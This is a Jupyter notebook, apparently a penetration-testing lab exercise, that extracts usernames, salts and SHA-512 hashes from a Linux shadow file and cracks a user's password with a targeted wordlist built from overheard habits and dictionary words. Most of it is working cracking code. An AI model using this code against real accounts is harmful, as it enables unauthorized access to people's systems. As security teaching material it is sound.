{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " # Sample Codes for Linux Password Cracking in a Sample PenTest "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is a DEMO to demostrate how to attack passwords on Linux using Python libraries in a Sample PenTest "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You are given\n",
    "\n",
    "1- A shadow file (contains encrypted passwords in Linux)\n",
    "\n",
    "2- An american-english dictionary file (contains all words in English)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# PennTest DEMO Scenario:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You are performing a penetration test in which you need to crack a password of a specific user. You\n",
    "successfully downloaded the Shadow file from a remote server.\n",
    "\n",
    "We overheard that Jane complained that her company mandates MONTHLY password change. She also bragged about how she is able to easily find new passwords and remember them perfectly. She said would start a password with a QUESTION MARK, followed by a short word she can remember. She will fill the rest of the password with the year and month. Based on what Jane said, we’d like to create the following assumptions.\n",
    "\n",
    "The password is 8 characters long (Jane just wants to fulfill the minimum company requirement)\n",
    "\n",
    "The first letter is “?” (Jane said it)\n",
    "\n",
    "The last four letters are digits for the year (two digits) and month (digits). Today is in June 2020. \n",
    "\n",
    "So, the last first digits are “0620” or “2006”\n",
    "\n",
    "The missing 3 characters will be a three-letter dictionary word with only one character capitalized.\n",
    "\n",
    "Use the dictionary in “/usr/share/dict/american-english”. Extract all three-letter English words. You\n",
    "need to remove the words with apostrophe such as “A’s”."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Solution:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Extract usernames, salts, hashes from Shadow file\n",
    "\n",
    "f=open(\"shadow\",\"r\") \n",
    "lines=f.read().split()\n",
    "f.close()\n",
    "\n",
    "usernames = []\n",
    "salts =[]\n",
    "hashes =[] \n",
    "\n",
    "for line in lines: \n",
    "\tif \"$6\" in line:\n",
    "\t\t#print(line)\n",
    "\t\tsections = line.split(\"$\")\n",
    "\t\tusernames.append(sections[0].split(\":\")[0])\n",
    "\t\tsalts.append(sections[2])\n",
    "\t\thashes.append(sections[3].split(\":\")[0])\n",
    "\n",
    "result1 = dict(zip(usernames, hashes))      \n",
    "        \n",
    "print(\"Usernames and Hashes : \" +  str(result1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Create a password list for attack\n",
    "\n",
    "usdict=open(\"american-english\", \"r\")\n",
    "usdictlines=usdict.read().split()\n",
    "usdict.close()\n",
    "#Extract all words which have 3 letters\n",
    "WordList = []\n",
    "for words in usdictlines:\n",
    "    if len(words) ==3:\n",
    "        WordList.append(words.capitalize())\n",
    "\n",
    "from passlib.hash import sha512_crypt\n",
    "from itertools import permutations\n",
    "\n",
    "#The last four digits\n",
    "dates= [\"0620\", \"2006\"]\n",
    "\n",
    "#Creating combinations useing permutations\n",
    "combos=[]\n",
    "for n in WordList: \n",
    "\tfor d in dates:\n",
    "\t\tperm = permutations([n,\"?\",d],3)\n",
    "\t\tfor p in list(perm):\n",
    "\t\t\tcombos.append(''.join(p))\n",
    "print(\"The length of all (combinations)permutations: \", len(combos))\n",
    "\n",
    "#Cleaning combinations to get rid of unnecessary items. Here we remove items if they do not start with \"?\" and if they continue with date. It should continue 3 letters.\n",
    " \n",
    "clear_combos =[]\n",
    "for c in range (0,len(combos)):\n",
    "    if combos[c][0] == \"?\" and combos[c][1] != \"2\" and combos[c][1] != \"0\" :\n",
    "        clear_combos.append(combos[c])\n",
    "print(\"The length of cleared (combinations)permutations: \", len(clear_combos))\n",
    "print(\"Let's compare the combinations' hashes with the shadow passwords' hashes...\")\n",
    "print(\"As an example, our last 3 password in dictionary: \",clear_combos[-4:-1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Crack the password by comparing real passwords' hashes with created list\n",
    "\n",
    "for i in range(len(hashes)):\n",
    "\tfor cc in range(len(clear_combos)):\n",
    "\t\tif hashes[i] == sha512_crypt.using(rounds=5000, salt=salts[i]).hash(clear_combos[cc]).split(\"$\")[-1]:\n",
    "\t\t\tprint(\"#####################\")\n",
    "\t\t\tprint(\"The password has been found by 'YOUR NAME' !!\")\n",
    "\t\t\tprint(\"Username is \" + usernames[i])\n",
    "\t\t\tprint(\"Password is \" + clear_combos[cc])\n",
    "\t\t\tprint(\"#####################\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
